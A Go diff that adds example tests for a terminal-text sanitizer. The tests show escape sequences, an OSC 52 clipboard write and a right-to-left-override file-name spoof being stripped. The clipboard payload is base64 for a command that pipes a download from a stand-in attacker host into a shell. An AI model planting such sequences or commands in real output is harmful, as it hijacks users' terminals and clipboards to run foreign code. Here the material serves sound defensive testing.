@@ -25,6 +25,22 @@ func ExampleSanitizeLines() {
 	// "\x1b[31mexit code 1\x1b[0m"
 }
 
+// A comment somebody typed is shown in the program's own colors only: the
+// sender's red and the clipboard write it carried, in either form, are gone.
+func ExamplePlain() {
+	comment := "\x1b[31mURGENT:\x1b[0m call me\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07\u009d52;c;Zm9v\u009c"
+	fmt.Printf("%q\n", term.Plain(comment))
+	// Output:
+	// "URGENT: call me"
+}
+
+// A file name stays on its line and in the order it was written.
+func ExamplePlainLine() {
+	fmt.Printf("%q\n", term.PlainLine("invoice\u202efdp.exe\r\n\x1b[2J  (2 MB)"))
+	// Output:
+	// "invoicefdp.exe (2 MB)"
+}
+
 func ExampleWrap() {
 	fmt.Println(term.Wrap("Dry run: would tag 8.4.25 and push it, then wait for its pipeline.", 40, "         "))
 	// Output:
